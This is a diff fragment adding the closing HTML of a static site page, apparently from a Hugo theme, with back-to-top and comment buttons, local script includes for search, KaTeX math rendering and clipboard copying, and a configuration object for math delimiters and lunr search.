+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/twemoji/twemoji.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"},"twemoji":true};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
